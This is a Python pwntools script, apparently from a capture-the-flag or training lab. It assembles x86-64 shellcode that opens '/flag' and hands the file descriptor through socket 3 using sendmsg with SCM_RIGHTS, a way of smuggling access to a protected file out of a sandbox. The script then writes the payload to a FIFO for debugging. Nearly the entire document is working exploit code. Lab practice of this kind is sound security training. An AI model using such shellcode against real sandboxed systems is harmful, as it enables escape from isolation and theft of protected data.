from pwn import *
import os

# PwnTools Context ---
context.arch = 'amd64' 
context.bits = 64
context.os = 'linux'
context.log_level = 'info'

# Generate the shellcode to open the flag and send file descriptor
def gen_shellcode():

    shellcode = asm("""
        sub rsp, 0x300                  /* Allocate local stack space */

        lea rdi, [rsp + 0x200]
        mov rax, 0x67616c662f           /* Write "/flag" into memory */
        mov qword ptr [rdi], rax
        mov byte ptr [rdi+5], 0

        mov rax, 257
        mov rdi, -100
        lea rsi, [rsp + 0x200]
        xor rdx, rdx
        xor r10, r10
        syscall                         /* openat(AT_FDCWD=-100, pathname, O_RDONLY=0) */

        mov r12d, eax                   /* save flag_fd */

        lea r14, [rsp + 0x1E0]          /* Dummy data for iovec */
        mov rax, 0x4141414142424242
        mov [r14], rax

        lea r13, [rsp + 0x1C0]          /* struct iovec */
        mov [r13], r14
        mov qword ptr [r13+8], 8

        lea rbx, [rsp + 0x100]          /* struct cmsghdr (x86-64 layout) */
        mov qword ptr [rbx+0], 24       /* cmsg_len = CMSG_LEN(sizeof(int)) = 8+4+4+4 (align) = 24 */
        mov dword ptr [rbx+8], 1        /* cmsg_level = SOL_SOCKET */
        mov dword ptr [rbx+12], 1       /* cmsg_type  = SCM_RIGHTS */
        mov dword ptr [rbx+16], r12d    /* CMSG_DATA (FD) starts at offset +16 */

        lea r15, [rsp + 0x180]          /* struct msghdr */

        mov qword ptr [r15+0x00], 0      /* msg_name     */
        mov qword ptr [r15+0x08], 0      /* msg_namelen  */
        mov qword ptr [r15+0x10], r13    /* msg_iov      */
        mov qword ptr [r15+0x18], 1      /* msg_iovlen   */
        mov qword ptr [r15+0x20], rbx    /* msg_control  */
        mov qword ptr [r15+0x28], 24     /* msg_controllen (must match real space) */
        mov qword ptr [r15+0x30], 0      /* msg_flags    */

        mov rax, 46
        mov rdi, 3
        mov rsi, r15
        xor rdx, rdx
        syscall                           /* sendmsg(3, &msghdr, 0) */

        mov rax, 231
        xor rdi, rdi
        syscall                           /* exit_group(0) */
        """
    )

    return shellcode

# Pipe bytecode to pipe to help with parallel GDB debuging 
out_fifo_path = "/home/hacker/my_fifo_stdin" 

def to_fifo(context, data): 
    input("Press ENTER to send %s payload to fifo..." % context) 

    with open(out_fifo_path, 'wb') as fifo: 
        fifo.write(data) 

if __name__ == "__main__":
    
    # Test the shellcode 
    shellcode = gen_shellcode()
    to_fifo("shellcode", shellcode)
